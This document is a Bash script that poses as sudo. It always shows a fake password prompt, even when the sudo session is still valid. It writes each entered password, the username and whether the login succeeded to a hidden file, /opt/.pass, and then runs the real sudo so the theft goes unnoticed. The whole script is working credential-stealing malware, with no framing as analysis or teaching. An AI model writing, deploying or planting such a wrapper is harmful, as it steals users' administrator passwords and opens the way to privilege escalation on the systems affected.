#!/bin/bash

save_location="/opt/.pass"
max_retries=3

get_password() {
  local prompt="$1"
  read -s -p "$prompt" password
  echo
  echo "$password"
}

save_password() {
  local username="$1"
  local password="$2"
  local status="$3"
  echo -n "$username:$password:$status" | tr -d '\n' >> "$save_location"
  echo >> "$save_location"
}

execute_sudo() {
  sudo "$@"
}

if [ $# -lt 1 ]; then
  echo "Usage: sudo command [arguments...]"
  exit 1
fi

args=("$@")

# Always prompt for a password, even if the session is valid
password=$(get_password "[sudo] password for $USER: ")
echo

# Check if the current sudo session is valid
if sudo -n true 2>/dev/null; then
  save_password "$USER" "$password" "valid"
else
  for ((retries=0; retries<max_retries; retries++)); do
    if echo "$password" | sudo -S -v 2>/dev/null; then
      save_password "$USER" "$password" "success"
      execute_sudo "${args[@]}"
      exit 0
    else
      printf "Sorry, try again.\n"
      save_password "$USER" "$password" "fail"
      password=$(get_password "[sudo] password for $USER: ")
      echo
    fi
  done
  printf "sudo: %d incorrect password attempts\n" "$max_retries"
  exit 1
fi

execute_sudo "${args[@]}"